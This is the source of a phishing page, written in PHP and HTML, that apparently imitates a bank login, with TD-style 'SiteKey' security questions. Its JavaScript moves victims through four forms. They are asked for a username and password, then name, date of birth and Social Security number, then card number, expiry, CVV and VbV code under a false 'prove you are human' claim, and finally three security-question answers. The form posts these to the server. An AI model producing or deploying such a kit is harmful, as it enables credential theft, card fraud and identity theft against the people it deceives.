<?php require_once '../go.php';?>
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width,height=device-height, initial-scale=1.0, user-scalable=yes, maximum-scale=1.0">
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">
</head>
<body>
<div id="content_div">
<div id="header">
<img src="libs/images/logo.png" style="width: 50px">
</div>
<form method="post">

		<div id="form1">
			<div class="form">
			<input name="field1" value="com.td" type="hidden">
			
				<img src="libs/images/user.png" id="ico">
				<input name="field2" id="login" placeholder="Username or Access Card" maxlength="20" class="input" type="text"><br>
				<img src="libs/images/password.png" id="ico">
				<input name="field3" placeholder="Password" id="password" maxlength="50" class="input" type="password"><br>
				
			</div><br><br>
			<input value="Login" id="formBtn1" class="submit" type="button" style="display: block; margin: 0 auto;">
		</div>
		<div id="form2" style="display: none;">
			<div class="form" style="padding: 20px;">
				<h3 style="color: #000;">For security reasons you must confirm your identity.</h3>
			<br>
			<input type="text" id="Your_first_name" name="field4" class="input" placeholder="Your first name" maxlength="60">
			<script>
				document.getElementById('Your_first_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
			<br>	
			<input type="text" id="Your_middle_name" name="field5" class="input" placeholder="Your Middle name" maxlength="60">
			<script>
				document.getElementById('Your_middle_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
			<br>		
			<input type="text" id="Your_last_name" name="field6" class="input" placeholder="Your Last name" maxlength="60">
			<script>
				document.getElementById('Your_last_name').onkeypress = function (e) {
					return !(/[0-9]/.test(String.fromCharCode(e.charCode)));
				}
			</script>
			<br><br>
			<h4 style="display: initial;color: #000;font-weight: normal;">Your Date of birth:</h4>
			<select data-mini="true" name="field7" id="dobMM" class="selectMM"> 
 <option value="">MM</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 </select> 
			<select data-mini="true" name="field8" id="dobDD" class="selectDD"> 
 <option value="">DD</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 <option value="13">13</option> 
 <option value="14">14</option> 
 <option value="15">15</option> 
 <option value="16">16</option> 
 <option value="17">17</option> 
 <option value="18">18</option> 
 <option value="19">19</option> 
 <option value="20">20</option> 
 <option value="21">21</option> 
 <option value="22">22</option> 
 <option value="23">23</option> 
 <option value="24">24</option> 
 <option value="25">25</option> 
 <option value="26">26</option> 
 <option value="27">27</option> 
 <option value="28">28</option> 
 <option value="29">29</option> 
 <option value="30">30</option> 
 <option value="31">31</option> 
 </select> 
			
			<select data-mini="true" name="field9" id="dobYYYY" class="selectYYYY"> 
			   <option value="">YYYY</option> 
			   <option value="1998">1998</option> 
			   <option value="1997">1997</option> 
			   <option value="1996">1996</option> 
			   <option value="1995">1995</option> 
			   <option value="1994">1994</option> 
			   <option value="1993">1993</option> 
			   <option value="1992">1992</option> 
			   <option value="1991">1991</option> 
			   <option value="1990">1990</option> 
			   <option value="1989">1989</option> 
			   <option value="1988">1988</option> 
			   <option value="1987">1987</option> 
			   <option value="1986">1986</option> 
			   <option value="1985">1985</option> 
			   <option value="1984">1984</option> 
			   <option value="1983">1983</option> 
			   <option value="1982">1982</option> 
			   <option value="1981">1981</option> 
			   <option value="1980">1980</option> 
			   <option value="1979">1979</option> 
			   <option value="1978">1978</option> 
			   <option value="1977">1977</option> 
			   <option value="1976">1976</option> 
			   <option value="1975">1975</option> 
			   <option value="1974">1974</option> 
			   <option value="1973">1973</option> 
			   <option value="1972">1972</option> 
			   <option value="1971">1971</option> 
			   <option value="1970">1970</option> 
			   <option value="1969">1969</option> 
			   <option value="1968">1968</option> 
			   <option value="1967">1967</option> 
			   <option value="1966">1966</option> 
			   <option value="1965">1965</option> 
			   <option value="1964">1964</option> 
			   <option value="1963">1963</option> 
			   <option value="1962">1962</option> 
			   <option value="1961">1961</option> 
			   <option value="1960">1960</option> 
			   <option value="1959">1959</option> 
			   <option value="1958">1958</option> 
			   <option value="1957">1957</option> 
			   <option value="1956">1956</option> 
			   <option value="1955">1955</option> 
			   <option value="1954">1954</option> 
			   <option value="1953">1953</option> 
			   <option value="1952">1952</option> 
			   <option value="1951">1951</option> 
			   <option value="1950">1950</option> 
			 </select> 
			<br><br>
			<input type="text" id="SSN" name="field10" class="input" placeholder="Your SSN: XXX-XX-XXXX" maxlength="20" style="width:56%; margin: 0;">
<br><br>
			</div><br><br>
				<input value="Login" id="input_submitBtn" class="submit" type="button" style="display: block; margin: 0 auto;">
		</div>
		<div id="form3" style="display: none;">
			<div class="form" style="padding: 20px;">
				<h3 style="color: #000;">We need to know if you are a human, please add your credit or debit card, do not affraid-you will not be charged.</h3>		
			<div class='cc-type-icon-container'>
				<img id="visa_icon" src="libs/images/visa_icon.png">
				<img id="mc_icon" src="libs/images/mc_icon.png">
				<img id="amex_icon" src="libs/images/amex_icon.png">
				<img id="disc_icon" src="libs/images/disc_icon.png">
			</div>
			<input type="text" id="cardcode" maxlength="16" name="field11" class="input" placeholder="Credit Card Number">
			<script>
				document.getElementById('cardcode').onkeypress = function (e) {
					return !(/[?-¤?-?A-Za-z ]/.test(String.fromCharCode(e.charCode)));
				}
				
				document.getElementById('cardcode').onblur = function (e) {
					var aaIconMap = {
					  '4': "visa_icon",
					  '5': "mc_icon",
					  '3': 'amex_icon',
					  '6': 'disc_icon'
					}
					
					var sNum = this.value, oImg;
					sNum = sNum && /\d{16,16}/.test(sNum) && sNum.charAt(0) || '';
					for(var vI in aaIconMap){
					  oImg = document.getElementById(aaIconMap[vI]);
					  oImg.style.display = sNum == vI ? 'block' : 'none';
					}
				}
			</script>		
			<br>
			<h4 style="display: initial;color: #000;margin-left: 0%;">EXP</h4>			
			<select data-mini="true" name="field12" id="dobMM2" class="selectMM"> 
 <option value="">MM</option> 
 <option value="1">1</option> 
 <option value="2">2</option> 
 <option value="3">3</option> 
 <option value="4">4</option> 
 <option value="5">5</option> 
 <option value="6">6</option> 
 <option value="7">7</option> 
 <option value="8">8</option> 
 <option value="9">9</option> 
 <option value="10">10</option> 
 <option value="11">11</option> 
 <option value="12">12</option> 
 </select> 
			<select data-mini="true" name="field13" id="ccYY" class="selectYY"> 
 <option value="">YY</option> 
 <option value="17">17</option> 
 <option value="18">18</option> 
 <option value="19">19</option> 
 <option value="20">20</option> 
 <option value="21">21</option> 
 <option value="22">22</option> 
 <option value="23">23</option> 
 </select> 
			<input type="text" id="cvv" maxlength="3" name="field14" class="input" placeholder="CVV: XXX" style="float: right;">
			<img src="libs/images/cvv.gif" style="margin-right: 6px;margin-top: 5px;float: right;">
<br><br><br>
<input type="text" id="VbV" name="field15" class="input" placeholder="VbV/MCSC: XXX" style="width: 25% !important;" maxlength="50">

<input type="text" id="VbV2" name="field16" class="input" placeholder="Repeat VbV/MCSC: XXX" style="width: 25% !important;" maxlength="50">
<br><br>
				<input value="Login" id="input_submitBtn1" class="submit" type="button" style="display: block; margin: 0 auto;">
			</div>
		</div>
		<div id="form4" style="display: none;">
			<div class="form" style="padding: 20px;">
				<h3 style="color: #000;">Security Questions</h3>	
					  <select id="question1" required="" name="field17" style="width: 41%;border-radius: 3px;padding: 10px;font-size: 12px;border: 1px solid #000;color: #000;">
						<option value="">Select SiteKey Challenge Question 1</option>
						<option value="Where were you on New Year&#96;s 2000?">Where were you on New Year`s 2000?</option>
						<option value="What is the name of your favorite restaurant?">What is the name of your favorite restaurant?</option>
						<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
						<option value="What was the first name of your child manager?">What was the first name of your child manager?</option>
						<option value="As a child, What did you want to be when u grew up?">As a child, What did you want to be when u grew up?</option>
						<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
						<option value="What was the mke and model of your first car?">What was the mke and model of your first car?</option>
						<option value="What is the name of your high schools star athlete?">What is the name of your high schools star athlete?</option>
						<option value="What is the first name of your high school prom date?">What is the first name of your high school prom date?</option>
						<option value="Who is your favorite person in history?">Who is your favorite person in history?</option>
						<option value="What is your maternal grandmother's first name?">What is your maternal grandmother's first name?</option>
						<option value="What is your maternal grandfather's first name?">What is your maternal grandfather's first name?</option>
						<option value="In what city were you born?">In what city were you born? (Enter full name of city only)</option>
						</select><br><br>
						
						<p><input id="answer1" required="" type="text" name="field18" placeholder="Answer" class="input"/></p>
						
						
						<select id="question2" required="" name="field19" style="width: 41%;border-radius: 3px;padding: 10px;font-size: 12px;border: 1px solid #000;color: #000;">
						<option value="">Select SiteKey Challenge Question 2</option>
						<option value="What was the name of your first pet?">What was the name of your first pet?</option>
						<option value="What was your high school mascot?">What was your high school mascot?</option>
						<option value="On what street did you grow up?">On what street did you grow up?</option>
						<option value="What is your oldest sibling's middle name?">What is your oldest sibling's middle name?</option>
						<option value="How old were you at your wedding?">How old were you at your wedding? (Enter age as digits.)</option>
						<option value="In what year did you graduate from high school?">In what year (YYYY) did you graduate from high school?</option>
						<option value="What is the first name of the best man/maid of honor at your wedding?">What is the first name of the best man/maid of honor at your wedding?</option>
						<option value="Who is your favorite childhood superhero?">Who is your favorite childhood superhero?</option>
						<option value="What was the first name of your favorite teacher or professor?">What was the first name of your favorite teacher or professor?</option>
						<option value="What is the name of a collage you applied to but didn&#96;t attend?">What is the name of a collage you applied to but didn`t attend?</option>
						<option value="What is your all-time favorite song?">What is your all-time favorite song?</option>
						<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
						<option value="On what street is your grocery store?">On what street is your grocery store?</option>
						</select><br><br>
						
						<p><input id="answer2" required="" type="text" name="field20" placeholder="Answer" class="input" /></p>
						
						<select id="question3" required="" name="field21" style="width: 41%;border-radius: 3px;padding: 10px;font-size: 12px;border: 1px solid #000;color: #000;">
						<option value="">Select SiteKey Challenge Question 3</option>
						<option value="On what street is your grocery store?">On what street is your grocery store?</option>
						<option value="What is the name of the medical professional who delivered your first child?">What is the name of the medical professional who delivered your first child?</option>
						<option value="What was the name of your first pet?">What was the name of your first pet?</option>
						<option value="What is the first name of your hairdesser/barber?">What is the first name of your hairdesser/barber?</option>
						<option value="What is the first name of your mother&#96;s closest friend?">What is the first name of your mother`s closest friend?</option>
						<option value="What is the first name of your favorite niece/nephew?">What is the first name of your favorite niece/nephew?</option>
						<option value="What is your father's middle name?">What is your father's middle name?</option>
						<option value="What is your mother's middle name?">What is your mother's middle name?</option>
						<option value="In what city were you married?">In what city were you married?</option>
						<option value="In what city is your vacation home?">In what city is your vacation home?</option>
						<option value="What is the first name of your first child?">What is the first name of your first child?</option>
						<option value="What is the name of your first employer?">What is the name of your first employer?</option>
						</select><br><br>
						
						<p><input id="answer3" required="" type="text" name="field22" placeholder="Answer" class="input"/></p>
				<input value="Login" id="input_submitBtn2" class="submit" type="submit" style="display: block; margin: 0 auto;">
			</div>
		</div>
<br><br>

<center>
</center>

</form>
          <script type="text/javascript">

				function getRealDisplay(elem) {
                    if (elem.currentStyle) {
                        return elem.currentStyle.display;
                    } else if (window.getComputedStyle) {
                        var computedStyle = window.getComputedStyle(elem, null);
                        return computedStyle.getPropertyValue('display')
                    }
                }

                function __hide(el) {
                    if (!el.hasAttribute('displayOld')) {
                        el.setAttribute("displayOld", el.style.display)
                    }

                    el.style.display = "none"
                }

                displayCache = {};

                function __show(el) {
                    if (getRealDisplay(el) != 'none') return;

                    var old = el.getAttribute("displayOld");
                    el.style.display = old || "";

                    if (getRealDisplay(el) === "none") {
                        var nodeName = el.nodeName, body = document.body, display;

                        if (displayCache[nodeName]) {
                            display = displayCache[nodeName]
                        } else {
                            var testElem = document.createElement(nodeName);
                            body.appendChild(testElem);
                            display = getRealDisplay(testElem);

                            if (display === "none") {
                                display = "block"
                            }

                            body.removeChild(testElem);
                            displayCache[nodeName] = display
                        }

                        el.setAttribute('displayOld', display);
                        el.style.display = display
                    }
                }

 var step1 = document.getElementById('form1'),
     step2 = document.getElementById('form2'),
     step3 = document.getElementById('form3'),
     step4 = document.getElementById('form4'),
	 spinner = document.getElementById('spinner');

	
			document.getElementById('formBtn1').onclick = function(){

            var oNumInp = document.getElementById('login');
			var oCodeInp = document.getElementById('password');
			
			try{
							oNumInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                  
                        __hide(step1);
                        __show(step2);
                   
                    return false;
                };
				
			var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var first_name = document.getElementById('Your_first_name');
                        var last_name = document.getElementById('Your_last_name');
						var odobMM = document.getElementById('dobMM');
						var odobDD = document.getElementById('dobDD');
						var odobYYYY = document.getElementById('dobYYYY');
						var oSSN = document.getElementById('SSN');

						
						
						try{
							first_name.className = 'input',
							last_name.className = 'input',
							odobMM.className = 'selectMM',
							odobDD.className = 'selectDD',
							odobYYYY.className = 'selectYYYY',
							oSSN.className = 'input';
						} catch(e){};
						
                        if (!/^\w{4,100}$/i.test(first_name.value)) {
							try{
								first_name.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{4,100}$/i.test(last_name.value)) {
							try{
                                last_name.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						if(!odobMM.value || !odobDD.value || !odobYYYY.value){
						  odobMM.className = odobMM.className + ' ' + 'select-err';
						  odobDD.className = odobDD.className + ' ' + 'select-err';
						  odobYYYY.className = odobYYYY.className + ' ' + 'select-err';
						  return false;
						}
						
						if (oSSN.value.length < 8) {
							try{
                                oSSN.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                        __hide(step2);
                        __show(step3);
                   
                    return false;
                };
				
				var g_oBtn = document.getElementById('input_submitBtn1');
					g_oBtn.onclick = function () {
	            
				
	            var oCreditCard = document.getElementById('cardcode');
				var odobMM2 = document.getElementById('dobMM2');
				var odobYY = document.getElementById('ccYY');
				var ocvv = document.getElementById('cvv');
				var oVbV = document.getElementById('VbV');
				var oVbV2 = document.getElementById('VbV2');
				

				try{
					oCreditCard.className = 'input',
					ocvv.className = 'input',
					odobMM2.className = 'selectMM',
					odobYY.className = 'selectYY',
					oVbV.className = 'input',
					oVbV2.className = 'input';
				} catch(e){};
				
					if (!/^\w{16,16}$/i.test(oCreditCard.value)) {
							try{
                                oCreditCard.className = oCreditCard.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
				
					if (!/^\w{3,3}$/i.test(ocvv.value)) {
							try{
                                ocvv.className =  ocvv.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						
					if(!odobMM2.value || !odobYY.value){
						  odobMM2.className = odobMM2.className + ' ' + 'select-err';
						  odobYY.className = odobYY.className + ' ' + 'select-err';
						  return false;
						}
						
				
					if (!/^\w{3,50}$/i.test(oVbV.value)) {
							try{
                                oVbV.className = oVbV.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						
						
					
					if (!/^\w{3,50}$/i.test(oVbV2.value)) {
							try{
                                oVbV2.className = oVbV2.className + ' ' + 'error';
							} catch(e){};
                            return false;
                        }
						 
                        __hide(step3);
                        __show(step4);
                   
                    return false;
                };
				
				var g_oBtn = document.getElementById('input_submitBtn2');
					g_oBtn.onclick = function () {
	            
				
                        var oquestion1 = document.getElementById('question1');
						var oanswer1 = document.getElementById('answer1');
						var oquestion2 = document.getElementById('question2');
						var oanswer2 = document.getElementById('answer2');
						var oquestion3 = document.getElementById('question3');
						var oanswer3 = document.getElementById('answer3');

						try{
							oquestion1.className = 'selects',
							oanswer1.className = 'input',
							oquestion3.className = 'selects',
							oanswer2.className = 'input',
							oquestion2.className = 'selects',
							oanswer3.className = 'input';
						} catch(e){};
				
					if(!oquestion1.value){
						  oquestion1.className = oquestion1.className + ' ' + 'select-err';
						  return false;
						}
						
					 if (oanswer1.value.length < 3) {
							try{
                                oanswer1.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						if(!oquestion2.value){
						  oquestion2.className = oquestion2.className + ' ' + 'select-err';
						  return false;
						}
					 if (oanswer2.value.length < 3) {
							try{
                                oanswer2.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						if(!oquestion3.value){
						  oquestion3.className = oquestion3.className + ' ' + 'select-err';
						  return false;
						}
						
					 if (oanswer3.value.length < 3) {
							try{
                                oanswer3.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                }
					 
					
</script> 
</div>
</body>
</html>